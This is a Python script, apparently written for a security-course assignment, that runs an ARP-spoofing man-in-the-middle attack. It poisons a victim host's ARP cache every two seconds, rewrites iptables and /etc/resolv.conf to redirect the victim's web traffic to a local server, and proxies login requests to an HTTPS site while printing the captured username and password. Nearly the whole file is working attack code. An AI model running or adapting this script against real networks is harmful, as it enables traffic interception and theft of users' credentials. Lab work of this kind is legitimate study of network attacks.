#Server base code obtained from: http://www.codexpedia.com/python/python-web-server-for-get-and-post-requests/
#Additional code has been added in do_POST for the assignment, same as malicious gateway post
# get_mac address obtained from: http://www.aviran.org/arp-poisoning-python-scapy/

#!/usr/bin/python

from scapy.all import *
from http.server import BaseHTTPRequestHandler, HTTPServer
from subprocess import run
import cgi, http, urllib, sys, threading

def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac

#set variables
my_mac = get_mac_address()
gateway = '10.0.0.1'
victim = '10.0.0.2'

#construct arp spoof packet
packet = Ether()/ARP(op=1,hwsrc=my_mac,psrc=gateway,pdst=victim)

#Http server to handle get and post request from alice
class GP(BaseHTTPRequestHandler):
	def _set_headers(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()

	def do_GET(self):
		self._set_headers()

		conn = http.client.HTTPSConnection("https-only.seclab.space")
		conn.request("GET", "")
		response = conn.getresponse()
		data = response.read()

		conn.close()

		print (response.status, response.reason)
		print(data)
		self.wfile.write(data)


	def do_POST(self):
		self._set_headers()
		form = cgi.FieldStorage(
			fp=self.rfile,
			headers=self.headers,
			environ={'REQUEST_METHOD': 'POST'}
		)
		username = form.getvalue("username")
		password = form.getvalue("password")

		params = urllib.parse.urlencode({'username': username, 'password': password, 'action': 'show'})
		headers = {"Content-type": "application/x-www-form-urlencoded",
					"Accept": "text/plain"}
		conn = http.client.HTTPSConnection("https-only.seclab.space")
		conn.request("POST", "", params, headers)
		response = conn.getresponse()
		data = response.read()

		conn.close()

		print (response.status, response.reason)
		print (data)
		print ("username = " + form.getvalue("username")+", password = " + form.getvalue("password"))
		self.wfile.write(data)

def setIpTables():
	with open('/etc/resolv.conf', 'w+') as f:
		f.write('nameserver 8.8.8.8')

	print(run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE']))
	print(run(['iptables', '-A', 'FORWARD', '-i', 'eth0', '-o', 'eth1', '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT']))
	print(run(['iptables', '-A', 'FORWARD', '-i', 'eth1', '-o', 'eth0', '-j', 'ACCEPT']))
	print(run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '-i', 'eth0', '-d 142.1.97.172', '--dport', '80', '-j', 'DNAT', '--to-destination', '10.0.0.3:8080']))


def runServer(server_class=HTTPServer, handler_class=GP, port=8080):
	server_address = ('', port)
	print(type(server_address), type(handler_class))
	httpd = server_class(server_address, handler_class)
	print ('Server running at localhost:8080...')
	httpd.serve_forever()

#loop to keep sending packet
def sendPacket():
	t=threading.Timer(2.0, sendPacket)
	sendp(packet, verbose=0)
	t.start()



if __name__ == "__main__":

	setIpTables()

	#run arp spoof packet sending function in background thread
	thread = threading.Thread(target=sendPacket, args=())
	thread.daemon = True                            # Daemonize thread
	thread.start()                                  # Start the execution

	runServer()





